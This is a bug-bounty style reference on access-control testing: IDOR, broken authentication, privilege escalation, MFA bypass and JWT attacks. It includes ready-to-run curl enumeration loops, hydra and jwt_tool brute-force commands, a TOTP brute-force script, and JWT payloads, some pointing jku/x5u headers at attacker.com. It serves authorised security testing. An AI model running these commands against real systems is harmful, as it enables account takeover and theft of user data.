# Access Control Vulnerabilities Reference

## Covers: IDOR, Broken Auth, Privilege Escalation, MFA Bypass, JWT Issues

---

## 1. Testing Checklist

### IDOR (Insecure Direct Object Reference)
1. Create two accounts (user A and user B) with different privilege levels
2. Map all API endpoints that reference objects by ID (numeric, UUID, slug)
3. Replay user A's request with user B's session - swap object IDs
4. Test all HTTP methods on each endpoint (GET, PUT, DELETE, PATCH)
5. Test ID types: sequential integers, UUIDs (try decrementing), encoded values (base64 decode -> modify -> re-encode)
6. Check for indirect references: filename, email, username as identifiers
7. Test GraphQL node queries: `node(id: "base64_encoded_id")`
8. Check API responses for leaked object IDs that shouldn't be visible
9. Test bulk/batch endpoints: `/api/users?ids=1,2,3,4,5`
10. Test file access endpoints: `/api/documents/{id}/download`
11. Check if object IDs are predictable (sequential, timestamp-based)
12. Test websocket messages with swapped IDs

### Broken Authentication
1. Test for credential stuffing resistance (rate limiting on login)
2. Test password reset: token predictability, token reuse, token expiration
3. Test account lockout bypass: IP rotation, header manipulation
4. Check session fixation: does session ID change after login?
5. Test concurrent session handling
6. Check session timeout/expiration
7. Test remember-me token security
8. Test OAuth/SSO misconfigurations
9. Check for username enumeration via login, registration, password reset responses/timing

### Privilege Escalation
1. Map all roles and their permissions (user, moderator, admin, super-admin)
2. Access admin endpoints directly with low-privilege session
3. Modify role/permission parameters in requests: `role=admin`, `isAdmin=true`
4. Test parameter pollution: add `admin=true` to registration/profile update
5. Check if privilege checks are only client-side (hidden UI elements but accessible API)
6. Test GraphQL mutations meant for admins with user tokens
7. Check for forced browsing to admin paths: `/admin`, `/management`, `/internal`

### MFA Bypass
1. Test if MFA can be skipped by directly navigating to post-MFA page
2. Test brute force of TOTP codes (check rate limiting)
3. Test backup code reuse
4. Check if MFA is enforced on all auth flows (API, mobile, SSO)
5. Test response manipulation: change `"mfa_required": true` to `false`
6. Test if MFA enrollment can be disabled via CSRF
7. Check for MFA status in JWT claims that can be forged
8. Test password reset flow: does it bypass MFA?
9. Test if MFA challenge can be replayed

### JWT Issues
1. Decode token (jwt.io or `jwt_tool`): check algorithm, claims, expiration
2. Test `alg: none` attack: `{"alg":"none"}` + empty signature
3. Test algorithm confusion: RS256 -> HS256 (sign with public key as HMAC secret)
4. Test `kid` injection: `kid: "../../dev/null"` or `kid: "key' UNION SELECT 'secret'--"`
5. Check `jku`/`x5u` header: point to attacker-controlled JWKS
6. Test expired tokens: are they still accepted?
7. Check for sensitive data in payload (PII, internal IDs, roles)
8. Test token without signature (truncate at last `.`)
9. Check refresh token rotation and reuse detection
10. Test `sub` claim modification for impersonation

---

## 2. Tool Commands

### IDOR
```bash
# Autorize (Burp extension) - best tool for IDOR, configure two sessions then browse
# Manual approach with curl:

# Get resource as user A
curl -s -H "Authorization: Bearer TOKEN_A" "https://target.com/api/users/123/profile"

# Try same resource as user B
curl -s -H "Authorization: Bearer TOKEN_B" "https://target.com/api/users/123/profile"

# Compare responses
diff <(curl -s -H "Authorization: Bearer TOKEN_A" "https://target.com/api/users/123") \
     <(curl -s -H "Authorization: Bearer TOKEN_B" "https://target.com/api/users/123")

# Enumerate IDs
for i in $(seq 1 100); do
  echo "=== ID: $i ==="
  curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer TOKEN_B" "https://target.com/api/orders/$i"
  echo
done
```

### JWT
```bash
# jwt_tool - comprehensive JWT testing
jwt_tool TOKEN -M at  # All automated tests
jwt_tool TOKEN -X a   # alg:none attack
jwt_tool TOKEN -X k -pk public.pem  # Key confusion (RS256->HS256)
jwt_tool TOKEN -I -pc role -pv admin  # Inject claim
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt  # Crack HMAC secret

# jwt-cracker (fast brute force for weak secrets)
jwt-cracker -t TOKEN -d /usr/share/wordlists/rockyou.txt
```

### Auth Testing
```bash
# Hydra - brute force login
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# ffuf - directory brute force for admin panels
ffuf -u "https://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -fc 404

# Username enumeration via response timing
ffuf -u "https://target.com/login" -X POST -d "username=FUZZ&password=invalid" -w usernames.txt -mc all -ft ">1000"
```

### MFA
```bash
# TOTP brute force (if no rate limiting)
for code in $(seq -w 000000 999999); do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/verify-mfa" \
    -H "Cookie: session=SESSION" -d "code=$code")
  if [ "$resp" != "403" ]; then echo "Code: $code -> $resp"; fi
done
```

---

## 3. Payloads

### IDOR Parameter Manipulation
```
# Sequential ID
/api/users/1 -> /api/users/2

# UUID manipulation (not always sequential but try)
/api/docs/550e8400-e29b-41d4-a716-446655440000

# Base64 encoded IDs
# Decode: echo "MTIz" | base64 -d -> "123"
# Modify: echo -n "124" | base64 -> "MTI0"
/api/users/MTIz -> /api/users/MTI0

# Hash-based IDs (MD5 of sequential numbers)
# MD5("1") = c4ca4238a0b923820dcc509a6f75849b

# GraphQL global IDs
# base64("User:123") = "VXNlcjoxMjM="
query { node(id: "VXNlcjoxMjQ=") { ... on User { email } } }

# Nested object references
{"order_id": 123, "user_id": 456}  # Change user_id

# Array of IDs
GET /api/data?ids[]=1&ids[]=2&ids[]=3
```

### Privilege Escalation Parameters
```json
{"role": "admin"}
{"isAdmin": true}
{"user_type": "administrator"}
{"permissions": ["read", "write", "admin"]}
{"group": "admins"}
{"level": 0}
{"access_level": 9999}
```

### JWT Attack Payloads
```json
// alg:none
{"alg": "none", "typ": "JWT"}
{"alg": "None", "typ": "JWT"}
{"alg": "NONE", "typ": "JWT"}
{"alg": "nOnE", "typ": "JWT"}

// kid injection
{"alg": "HS256", "kid": "/dev/null"}
{"alg": "HS256", "kid": "../../../../../../dev/null"}
{"alg": "HS256", "kid": "key' UNION SELECT 'ATTACKER_SECRET'-- "}
{"alg": "HS256", "kid": "../../../proc/sys/kernel/randomize_va_space"}

// jku/x5u header injection
{"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
{"alg": "RS256", "x5u": "https://attacker.com/cert.pem"}

// Claim manipulation
{"sub": "admin", "role": "admin", "iat": 1700000000, "exp": 9999999999}
```

### Password Reset Token Attacks
```
# Token in URL - check referer leakage
# Predictable tokens - check for timestamp-based or sequential
# Token reuse - use same reset link twice
# Cross-user token - request reset for user A, use link for user B (change email param)
# Race condition - request multiple resets, check if all tokens valid
```

---

## 4. Bypass Techniques

### IDOR Bypass
- **UUID not immune**: Check if UUIDs are leaked in other endpoints, API responses, or error messages
- **Parameter pollution**: `/api/users/123?user_id=456` (query param overrides path param)
- **HTTP method override**: `X-HTTP-Method-Override: DELETE` on a GET request
- **Wrapped IDs**: Try JSON body `{"id": 456}` instead of URL parameter
- **Alternate encodings**: hex `0x1C8`, octal, scientific notation `1e2`
- **Wildcard / array**: `*`, `[1,2,3]`, `1-100`
- **Version pinning**: `/api/v1/users/123` may lack checks that `/api/v2/users/123` has
- **GraphQL aliases**: Query same field with different IDs in one request

### Auth Bypass
- **Default credentials**: admin/admin, admin/password, test/test
- **Mass assignment in registration**: Add `role=admin` to signup request
- **Token leakage**: Check response headers, JS files, error messages for tokens
- **Session in URL**: Check if session ID appears in redirects or referrer headers
- **IP-based bypass**: `X-Forwarded-For: 127.0.0.1` to bypass IP restrictions
- **Rate limit bypass**: Rotate IP headers, add null bytes to params, change case

### MFA Bypass
- **Direct navigation**: Skip MFA page, go directly to `/dashboard`
- **API inconsistency**: Mobile API may not enforce MFA
- **Response manipulation**: Intercept response, change `success: false` to `success: true`
- **Backup code brute force**: Often 8-digit, less rate-limited than TOTP
- **SSO bypass**: If SSO login doesn't require MFA
- **Password reset bypass**: Reset password flow may not require MFA
- **Remember device token**: Steal or forge the device trust cookie
- **Race condition**: Submit multiple TOTP codes simultaneously

### JWT Bypass
- **None algorithm**: Set `alg` to `none`/`None`/`NONE` and remove signature
- **Key confusion**: Use RS256 public key as HS256 secret
- **Weak secret**: Brute force with common passwords
- **kid directory traversal**: Use `kid` to reference a known file (`/dev/null`, empty file)
- **jku spoofing**: Host your own JWKS endpoint if `jku` validation is weak
- **Expired token acceptance**: Backend doesn't check `exp` claim
- **Null signature**: Base64 header + payload + `.` (no signature section)

---

## 5. Impact Escalation

### IDOR
- Access other users' PII (name, email, address, payment info)
- Modify other users' data (email change -> ATO)
- Delete other users' resources
- Access admin-only resources
- Download other users' files (documents, medical records, financial data)
- Escalate to mass data exposure by enumerating all IDs

### Broken Auth
- Full account takeover via password reset flaws
- Session hijacking -> impersonate any user
- Credential stuffing -> mass ATO
- Admin account takeover -> full platform compromise

### Privilege Escalation
- Regular user -> admin: access all data, manage users, change configs
- Write access to read-only resources
- Access to internal/debug endpoints

### JWT
- Forge tokens for any user -> universal ATO
- Escalate to admin role via claim manipulation
- Bypass all authorization checks
- Permanent access if no token rotation

---

## 6. Chain Opportunities

| Found This | Look For |
|---|---|
| IDOR on user data | Leaked emails -> password reset ATO, leaked internal IDs -> deeper IDOR |
| IDOR on file access | Path traversal in file parameter, SSRF if file URL is fetched |
| Broken auth | CSRF on auth endpoints, race conditions in login/register |
| JWT weak secret | Forge admin tokens, chain with every other auth-gated vuln |
| MFA bypass | Combine with credential stuffing for mass ATO |
| Privilege escalation | Access admin features -> find more vulns in admin-only functionality |
| Username enumeration | Feed into targeted brute force / credential stuffing |
| Session fixation | Chain with XSS to set session cookie |

---

## 7. Common False Positives

- **IDOR**: Accessing your own data via a different endpoint (same user, different path)
- **IDOR**: Public data that's intentionally accessible by any authenticated user
- **IDOR**: UUIDs that are unguessable AND not leaked anywhere (theoretical vs practical)
- **Auth bypass**: Accessing genuinely public endpoints that don't require authentication
- **Privilege escalation**: Getting a 200 response with an access-denied message in the body
- **JWT**: Token contains non-sensitive metadata that appears concerning but isn't actionable
- **MFA**: Testing on an account where MFA isn't enabled
- **Broken auth**: Rate limiting appears absent but is enforced at CDN/WAF level (invisible to you)

---

## 8. Report Snippets

### IDOR
> The `[endpoint]` allows authenticated users to access resources belonging to other users by modifying the `[parameter]` value. By changing the [ID type] from `[value_A]` to `[value_B]`, I was able to access [victim's resource type], including [specific sensitive data]. Given the sequential/predictable nature of the identifiers, an attacker could enumerate and exfiltrate data for all [N] users on the platform.

### Broken Authentication - Account Takeover
> The password reset functionality at `[endpoint]` is vulnerable to [specific flaw: predictable token / no expiration / token reuse]. An attacker can exploit this to reset any user's password and gain full account access. Combined with the publicly accessible user enumeration on `[endpoint]`, this enables mass account takeover across the platform.

### JWT
> The application uses JWT tokens signed with `[algorithm]` but is vulnerable to [specific attack: none algorithm / key confusion / weak secret]. By forging a token with modified claims (`[claim]` changed to `[value]`), I was able to authenticate as any user, including administrators. This grants full access to all user data and administrative functionality.

### MFA Bypass
> The multi-factor authentication on `[endpoint]` can be bypassed by [specific technique]. After authenticating with valid credentials, an attacker can skip the MFA verification step and gain full account access. This renders the MFA protection ineffective and exposes all MFA-enrolled accounts to takeover if their passwords are compromised.

### Privilege Escalation
> A low-privileged user can escalate to `[target role]` by [specific technique: modifying role parameter / accessing admin endpoint directly / mass assignment]. This grants access to [specific admin capabilities], affecting the security of all users and the integrity of platform data.
